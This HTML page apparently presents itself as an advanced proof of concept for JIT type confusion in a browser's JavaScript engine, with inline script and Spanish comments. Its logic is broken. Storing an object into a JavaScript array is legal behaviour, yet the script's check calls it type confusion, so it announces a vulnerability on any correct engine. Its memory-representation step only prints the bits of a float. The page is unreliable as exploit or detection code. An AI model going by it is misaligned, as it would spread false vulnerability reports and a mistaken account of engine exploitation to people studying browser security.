<!DOCTYPE html>
<html>
<head>
  <title>Type Confusion Aggressive Test</title>
</head>
<body>
  <h1>Type Confusion - Advanced PoC</h1>
  <pre id="log"></pre>
  <script>
    const log = (msg) => document.getElementById("log").textContent += msg + "\n";

    function hex(x) {
      return "0x" + x.toString(16);
    }

    function trigger() {
      let float_array = [1.1, 2.2, 3.3, 4.4];
      let obj_array = [{}, {}, {}, {}];

      function confuse(arr, val) {
        for (let i = 0; i < 10000; i++) {
          arr[0] = 1.1;  // entrenamiento para JIT como float
        }
        arr[0] = val; // de pronto insertamos un objeto
        return arr[0];
      }

      let res = confuse(float_array, {a: 42});

      log("[*] Resultado: " + res);
      if (typeof res === "object") {
        log("[+] Type confusion detectada: se insertó un objeto en un array de floats");
      } else {
        log("[-] No se detectó confusión");
      }

      // Prueba adicional: ver el valor de la primera celda
      float_array[0] = 13.37;
      let view = new DataView(new ArrayBuffer(8));
      view.setFloat64(0, float_array[0], true);
      let low = view.getUint32(0, true);
      let high = view.getUint32(4, true);
      log("[*] Representación en memoria de 13.37: low=" + hex(low) + " high=" + hex(high));
    }

    trigger();
  </script>
</body>
</html>
